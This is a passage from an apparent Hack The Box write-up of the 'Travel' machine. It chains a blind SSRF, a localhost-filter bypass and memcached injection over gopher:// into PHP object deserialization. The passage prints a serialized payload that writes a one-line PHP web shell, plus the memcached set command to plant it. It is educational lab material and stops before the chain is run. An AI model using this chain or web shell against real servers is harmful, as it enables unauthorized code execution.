class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>RSS Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is an example of an RSS feed<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/main.html<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 06 Sep 2010 00:01:00 +0000 <span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ttl</span>&gt;</span>1800<span class="tag">&lt;/<span class="name">ttl</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example entry<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Here is some text containing an interesting description.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/blog/post/1<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Now navigating to <code>http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.18:8000/sample.xml</code> indeed display our custom RSS feed:</p><img width="1030" alt="travel custom rss" src="https://user-images.githubusercontent.com/9076747/83437662-69510100-a440-11ea-98a4-3d8ac8af6d79.png"><p>And we can see a new request have been made to our web server from the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.189 - - [5/May/2020 19:44:38] <span class="string">&quot;GET /sample.xml HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>That’s good, we got Blind SSRF (Server Side Request Forgery)!</p><p>But what now? With Blind SSRF only we can’t do much yet. Since we can’t even read local files using <code>file://</code>…</p><p>Let’s continue to review what we found so far to see if it can be linked with that SSRF.</p><h3 id="Debug-php"><a href="#Debug-php" class="headerlink" title="Debug.php"></a>Debug.php</h3><p>I then got curious about `debug.php file. Maybe it can leak juicy informations ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 132</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>Well that’s not very helpful. Yet while looking around and testing various things I got the <code>debug</code> to throw some informations. Indeed just after calling a <code>custom_feed_url</code> with the debug parameter we get the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=http://10.10.14.18:8000/sample.xml&quot;</span> -s &gt; /dev/null</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 198</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_a0e937ab19(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>Both output are truncated, yet we notice the <code>xct_</code> prefix here, if you remember we saw it being used by <code>SimplePie</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br></pre></td></tr></table></figure><p>SimplePie documentation explains:</p><blockquote><p> To use Memcache for SimplePie’s cache, simply set your cache location with a memcache.</p><p>For example, <code>memcache://localhost:11211/?timeout=3600&amp;prefix=sp_</code> will connect to memcache on localhost on port 11211. All tables will be prefixed with sp_ and data will expire after 3600 seconds.</p><p><a href="https://simplepie.org/api/class-SimplePie_Cache_Memcache.html">https://simplepie.org/api/class-SimplePie_Cache_Memcache.html</a></p></blockquote><p>Reading through SimplePie <code>memcache.php</code> <a href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> we understand the given prefix is used to generated the <code>memcached</code> entry key:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;prefix&#x27;</span>] . md5(<span class="string">&quot;<span class="subst">$name</span>:<span class="subst">$type</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>In addition, still reading through the source code of SimplePie we see that it’s serialize data and save it in the <code>memcached</code> entry. Once loading RSS from cache it will unserialize the stored data:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Save data to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|SimplePie $data Data to store in the cache. If passed a SimplePie object, only cache the $data property</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool Successfulness</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> <span class="keyword">instanceof</span> SimplePie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$data</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;set(<span class="keyword">$this</span>-&gt;name, serialize(<span class="variable">$data</span>) , MEMCACHE_COMPRESSED, (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;timeout&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve the data saved to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array Data for SimplePie::$data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;get(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> !== <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This make perfect sense with the output of <code>debug.php</code> that very probably show the lasted entry added (or loaded) from <code>memcached</code>:</p><ul><li>Key: <code>xct_a0e937ab19(...)</code></li><li>Content: <code>a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...)</code></li></ul><p>And now we can see how we could potentially exploit this flow…</p><h3 id="Object-Deserialization-Vulnerability"><a href="#Object-Deserialization-Vulnerability" class="headerlink" title="Object Deserialization Vulnerability"></a>Object Deserialization Vulnerability</h3><p>If you remember, in <code>template.php</code> we have this <code>TemplateHelper</code> Object:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we find a way to create a new instance of <code>TemplateHelper()</code> we could actually exploit the <code>file_put_contents()</code> to write a web-shell to  <code>wp-content/themes/twentytwenty/logs/</code>. Like so:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>That’s exactly what we need with the behaviour of <code>SimplePie</code> we found earlier. Let me explain.</p><ol><li><p><code>SimplePie</code> stores, for each RSS feed, a <code>memcached</code> entry containing serialized PHP. </p></li><li><p>Upon loading an RSS feed already cached before, <code>SimplePie</code> will take the <code>memcached</code> entry and unserialize the data with:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>By storing a malicious serialized <code>TemplateHelper()</code> object (the one shown above) in the right <code>memcached</code> entry, <code>SimplePie</code> will execute it during the unserialize process (as know as <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization">Insecure Deserialization Vulnerability</a>). This will write our web-shell to the server.</p></li></ol><p>Sounds all good. Yet we are missing one point: <em>How to write our malicious <code>memcached</code> entry ?</em></p><p>That’s where the SSRF vulnerability we found earlier come to play :) </p><h3 id="SimplePie-Memcached-Key"><a href="#SimplePie-Memcached-Key" class="headerlink" title="SimplePie Memcached Key"></a>SimplePie Memcached Key</h3><p>First of all, we need to make sure to write our malicious payload to a <code>memcached</code> entry that <code>SimplePie</code> will deserialize.</p><p>By the code we know for sure that the default RSS feed (<code>http://www.travel.htb/newsfeed/customfeed.xml</code>) is stored in <code>memcached</code> and loaded when we open <code>Awesome RSS</code> without extra parameters. </p><p>Knowing this the best way to go would be to overwrite <code>customfeed.xml</code> <code>memcached</code> entry with our malicious payload. </p><p>The syntax to update a <code>memcached</code> entry is the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set key flags exptime bytes [noreply]  </span><br><span class="line">value </span><br></pre></td></tr></table></figure><p>But an issue arise. How can we find the <code>memcached</code> key used by <code>SimplePie</code>?</p><p>Well we saw earlier from the <a href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> that key is the following format:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(feed_url + <span class="string">&quot;:spc&quot;</span>)</span><br></pre></td></tr></table></figure><p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span> . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">15</span>f4a13c9f97c9c2cf6791a16d4fa683</span><br></pre></td></tr></table></figure><p>Yet that doesn’t match the entry shown by the <code>debug.php</code> page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&quot;</span> -s &gt; /dev/null</span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php </span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_4e5612ba07(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>By digging a bit more in the source code we found that another <code>MD5</code> is being made on top of the previous one. Creating the hash this way: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://simplepie.org/api/source-class-SimplePie.html#1266</span></span><br><span class="line">MD5(MD5(feed_url + <span class="string">&quot;:spc&quot;</span>))</span><br></pre></td></tr></table></figure><p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5 as <code>memcached</code> key:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>) . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">4e5612</span>ba079c530a6b1f148c0b352241</span><br></pre></td></tr></table></figure><p>Bingo! That match the partiel key we got from <code>debug.php</code>. We now have the <code>memcached</code> key for the entry we want to overwrite.</p><h3 id="Memcached-injection"><a href="#Memcached-injection" class="headerlink" title="Memcached injection"></a>Memcached injection</h3><p>Alright that’s a lot of informations so far but we slowly manage to get all the pieces together right ?</p><img width="500" alt="travel" src="https://user-images.githubusercontent.com/9076747/83969018-80bf3c80-a8cd-11ea-8f14-e1ca4cf8ad92.jpg"><p>We have:</p><ul><li>Our malicious serialized PHP payload to drop a web-shell.</li><li>The <code>memcached</code> entry to inject our payload to.</li><li>SSRF</li></ul><p>It now seems straightforward to use server-side request forgery in order to inject our payload to <code>memcached</code> (running on internal port <code>11211</code>). </p><h4 id="Bypassing-SSRF-protection"><a href="#Bypassing-SSRF-protection" class="headerlink" title="Bypassing SSRF protection"></a>Bypassing SSRF protection</h4><blockquote><p>But wait… Didn’t we saw SSRF protection in <code>Template.php</code>?</p></blockquote><p>Let’s take a look at it:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"><span class="comment">// preventing all localhost access</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure><p>Well that’s quite weak protection and there is more than a way to bypass it:</p><ol><li><p>Since it’s using a weak comparison we could simply use capital “LOCALHOST” or even “localHost”:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;LOCALHOST&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;localhOst&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>And then well we have plenty of other ways to call on localhost that is not <code>localhost</code> nor <code>127.0.0.1</code>. Here is a few possible way:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl 127.0.0.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0.0.0.0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl  0177.0000.0000.0001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0x7F000001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 2130706433</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.00.00.1</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li><li><p>Using a domain name which DNS record pointing to <code>127.0.0.1</code> like <code>http://localtest.me</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://localtest.me/</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li></ol><p>As you can see it shouldn’t be hard to bypass this SSRF protection. From now on I will use <code>127.1</code>.</p><h4 id="Memcached-And-Gopher-Protocol"><a href="#Memcached-And-Gopher-Protocol" class="headerlink" title="Memcached And Gopher Protocol"></a>Memcached And Gopher Protocol</h4><p>Another problem arise, using HTTP to inject <code>memcached</code> payload probably won’t work since <code>HTTP</code> need a specific format to be valid (like <code>host</code> and a bunch of carriage return). </p><p> <code>memcached</code> protocol needs data to includes sequences of commands and data ending by two CRLF:</p><blockquote><p>There are two kinds of data sent in the memcache protocol: text lines<br>and unstructured data.  Text lines are used for commands from clients<br>and responses from servers. Unstructured data is sent when a client<br>wants to store or retrieve data. The server will transmit back<br>unstructured data in exactly the same way it received it, as a byte<br>stream. The server doesn’t care about byte order issues in<br>unstructured data and isn’t aware of them. There are no limitations on<br>characters that may appear in unstructured data; however, the reader<br>of such data (either a client or a server) will always know, from a<br>preceding text line, the exact length of the data block being<br>transmitted.</p><p>Text lines are always terminated by \r\n. Unstructured data is <em>also</em><br>terminated by \r\n, even though \r, \n or any other 8-bit characters<br>may also appear inside the data. Therefore, when a client retrieves<br>data from a server, it must use the length of the data block (which it<br>will be provided with) to determine where the data block ends, and not<br>the fact that \r\n follows the end of the data block, even though it<br>does.</p></blockquote><p>A workaround to this format issue is to use the <code>gopher://</code> protocol instead of <code>http://</code>:</p><blockquote><p>The Gopher protocol is a communications protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks. The design of the Gopher is presented as an alternative to the World Wide Web in its early stages, but ultimately fell into disfavor, yielding to the Hypertext Transfer Protocol (HTTP). </p><p><a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">https://en.wikipedia.org/wiki/Gopher_(protocol)</a></p></blockquote><p>While not being widely used, Gopher is still supported by <code>curl</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man curl</span><br><span class="line">DESCRIPTION</span><br><span class="line">       curl  is  a tool to transfer data from or to a server, using one of the supported protocols</span><br><span class="line">       (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT,  POP3,  POP3S,</span><br><span class="line">       RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP). The <span class="built_in">command</span> is designed to</span><br><span class="line">       work without user interaction.</span><br></pre></td></tr></table></figure><p>Alright! We those informations we can start creating our <code>memcached</code> command to inject on the server.</p><p>First let’s create our serialized PHP web-shell payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line">php &gt; <span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line">O:<span class="number">14</span>:<span class="string">&quot;TemplateHelper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hg8.php&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;?php system(<span class="subst">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>Now we can create the <code>memcached</code> command we need to execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set xct_4e5612ba079c530a6b1f148c0b352241 4 0 131</span><br><span class="line">O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:7:&quot;hg8.php&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>URL Encoding this command and send it through <code>curl</code> using <code>gopher://</code> protocol should work. Let’s give it a try and get our answer :) </p><h3 id="Chaining-vulnerabilities-for-RCE"><a href="#Chaining-vulnerabilities-for-RCE" class="headerlink" title="Chaining vulnerabilities for RCE"></a>Chaining vulnerabilities for RCE</h3><p>We have quite a few vulnerabilities to chain in order to achieve Remote Code execution. We need to:</p><p><strong>SSRF</strong> -&gt; <strong>Memcached Injection</strong> -&gt; <strong>Object Deserialization</strong> -&gt; <strong>Arbitrary File 